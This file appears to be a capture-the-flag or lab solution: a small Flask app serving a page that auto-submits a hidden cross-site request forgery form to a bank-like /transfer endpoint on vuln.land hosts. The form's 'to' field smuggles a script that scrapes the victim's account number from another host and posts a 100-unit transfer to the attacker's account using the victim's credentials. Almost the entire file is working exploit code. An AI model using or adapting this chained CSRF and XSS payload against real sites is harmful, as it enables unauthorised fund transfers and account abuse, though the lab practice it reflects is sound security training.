from flask import Flask
app = Flask(__name__)


@app.route('/transfer')
def transfer():
    return '''<html>
<body onload='document.CSRF.submit()'>
<form action='https://a52c6465-41a1-45ce-9d7b-53dfa6a4f940.idocker.vuln.land/transfer' method='POST' name='CSRF'>
    <input type='hidden' name='from' value='DC57C6B34ACC1AF505CB'>
    <input type='hidden' name='to' value='<script>let text  = await fetch("https://8c710973-d748-4db8-87f6-1ce2e24933b1.idocker.vuln.land/").then((r) => r.text());
    let regex = /([0-9A-F]{20})/;
    let srcAccount = regex.exec(text)[0];
    let formData = new FormData();
    formData.append("from", srcAccount);
    formData.append("to", "DC57C6B34ACC1AF505CB");
    formData.append("amount", "100");
    fetch("https://a52c6465-41a1-45ce-9d7b-53dfa6a4f940.idocker.vuln.land/transfer", {"method": "POST", "body": formData, "credentials": "include"});
</script>'>
    <input type='hidden' name='amount' value='100'>
</form>
</body>
</html>'''
